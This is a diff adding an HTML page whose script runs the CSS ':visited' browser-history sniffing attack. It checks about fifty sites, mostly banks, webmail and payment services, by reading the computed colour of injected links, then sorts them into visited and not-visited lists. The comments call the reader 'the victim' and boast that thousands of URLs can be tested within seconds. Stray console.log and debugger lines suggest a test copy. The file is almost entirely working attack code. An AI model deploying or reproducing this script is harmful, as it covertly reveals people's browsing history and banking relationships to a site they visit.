@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Document</title>
+  </head>
+  <body>
+    test
+    <div id="visited">visited</div>
+    <div id="notvisited">notvisited</div>
+    <script>
+      /* A short list of websites to loop through checking to see if the victim has been there.
+    Without noticable performance overhead, testing couple of a couple thousand URL's is
+    possible within a few seconds. */
+      var websites = [
+        'http://ha.ckers.org/blog/',
+        'http://login.yahoo.com/',
+        'http://mail.google.com/',
+        'http://mail.yahoo.com/',
+        'http://my.yahoo.com/',
+        'http://sla.ckers.org/forum/',
+        'http://slashdot.org/',
+        'http://www.amazon.com/',
+        'http://www.aol.com/',
+        'http://www.apple.com/',
+        'http://www.bankofamerica.com/',
+        'http://www.bankone.com/',
+        'http://www.blackhat.com/',
+        'http://www.blogger.com/',
+        'http://www.bofa.com/',
+        'http://www.capitalone.com/',
+        'http://www.cgisecurity.com/',
+        'http://www.chase.com/',
+        'http://www.citibank.com/',
+        'http://www.cnn.com/',
+        'http://www.comerica.com/',
+        'http://www.e-gold.com/',
+        'http://www.ebay.com/',
+        'http://www.etrade.com/',
+        'http://www.flickr.com/',
+        'http://www.google.com/',
+        'http://www.hsbc.com/',
+        'http://www.icq.com/',
+        'http://www.live.com/',
+        'http://www.microsoft.com/',
+        'http://www.microsoft.com/en/us/default.aspx',
+        'http://www.msn.com/',
+        'http://www.myspace.com/',
+        'http://www.passport.net/',
+        'http://www.paypal.com/',
+        'http://www.rsaconference.com/2007/US/',
+        'http://www.salesforce.com/',
+        'http://www.sourceforge.net/',
+        'http://www.statefarm.com/',
+        'http://www.usbank.com/',
+        'http://www.wachovia.com/',
+        'http://www.wamu.com/',
+        'http://www.wellsfargo.com/',
+        'http://www.whitehatsec.com/home/index.html',
+        'http://www.wikipedia.org/',
+        'http://www.xanga.com/',
+        'http://www.yahoo.com/',
+        'http://www2.blogger.com/home',
+        'https://banking.wellsfargo.com/',
+        'https://commerce.blackhat.com/',
+      ];
+
+      var visited = document.createElement('div');
+      var notvisited = document.createElement('div');
+      /* Loop through each URL */
+      for (let i = 0; i < websites.length; i++) {
+          /* create the new anchor tag with the appropriate URL information */
+          var link = document.createElement('a');
+          link.id = 'id' + i;
+          link.href = websites[i];
+          link.innerHTML = websites[i];
+          /* create a custom style tag for the specific link. Set the CSS visited selector to a known value, in this case red */
+          document.write('<style>');
+          document.write('#id' + i + ':visited {color: #FF0000; }');
+          document.write('</style>');
+
+          /* quickly add and remove the link from the DOM with enough time to save the visible computed color. */
+          document.body.appendChild(link);
+          var color = document.defaultView
+            .getComputedStyle(link, null)
+            .getPropertyValue('color');
+          document.body.removeChild(link);
+
+          /* check to see if the link has been visited if the computed color is red */
+          console.log(color)
+          if (color == 'rgb(255, 0, 0)') {
+            // visited
+
+            /* add the link to the visited list */
+            var item = document.createElement('li');
+            item.appendChild(link);
+            visited.appendChild(item);
+          } else {
+            // not visited
+
+            /* add the link to the not visited list */
+            var item = document.createElement('li');
+            item.appendChild(link);
+            notvisited.appendChild(item);
+          } // end visited color check if
+      } // end URL loop
+      // -->
+      document.getElementById('visited').appendChild(visited);
+      document.getElementById('notvisited').appendChild(notvisited);
+      debugger
+    </script>
+  </body>
+</html>
